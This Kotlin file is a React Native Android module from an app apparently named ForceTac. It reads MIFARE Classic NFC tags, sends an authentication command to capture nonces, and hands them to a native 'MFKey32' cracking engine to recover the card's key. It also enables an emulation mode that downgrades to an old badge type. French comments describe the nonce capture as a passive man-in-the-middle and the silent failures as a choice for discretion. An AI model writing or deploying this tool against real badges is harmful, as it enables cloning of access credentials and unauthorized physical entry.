package com.forcetac

import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.NfcA
import com.facebook.react.bridge.*
import com.facebook.react.modules.core.DeviceEventManagerModule

class NfcModule(private val reactContext: ReactApplicationContext) : ReactContextBaseJavaModule(reactContext), NfcAdapter.ReaderCallback {

    init {
        System.loadLibrary("forcetac_core")
    }

    override fun getName() = "NfcModule"

    // Appel C++ avec coordonnées GPS pour le dictionnaire intelligent
    external fun nativeHybridCrack(tagId: ByteArray, nonces: ByteArray, lat: Double, lon: Double): String?
    
    @ReactMethod
    fun startDowngrade() {
        // Active le service HCE pour simuler un vieux badge (SAK 0x08)
        HceService.enableDowngradeMode(true)
        sendEvent("DOWNGRADE_ACTIVE", null)
    }

    override fun onTagDiscovered(tag: Tag) {
        sendEvent("FIELD_DETECTED", null)
        val nfcA = NfcA.get(tag)
        
        try {
            nfcA.connect()
            // Sniffing Sandwich (Man-in-the-Middle passif)
            val authCmd = byteArrayOf(0x60.toByte(), 0x00.toByte()) 
            val response = nfcA.transceive(authCmd) // Capture des nonces
            
            sendEvent("CRACK_START", null)
            
            // Appel au moteur C++ (MFKey32)
            // Simulation de coordonnées si GPS non prêt
            val key = nativeHybridCrack(tag.id, response, 48.85, 2.35) 
            
            if (key != null) {
                val params = Arguments.createMap().apply { putString("key", key) }
                sendEvent("KEY_FOUND", params)
            }
        } catch (e: Exception) {
            // Silence en cas d'échec (Discrétion)
        } finally {
            nfcA.close()
        }
    }

    private fun sendEvent(eventName: String, params: WritableMap?) {
        reactContext.getJSModule(DeviceEventManagerModule.RCTDeviceEventEmitter::class.java)
            .emit("onNfcEvent", if (params == null) Arguments.createMap().apply { putString("type", eventName) } else params.apply { putString("type", eventName) })
    }
}
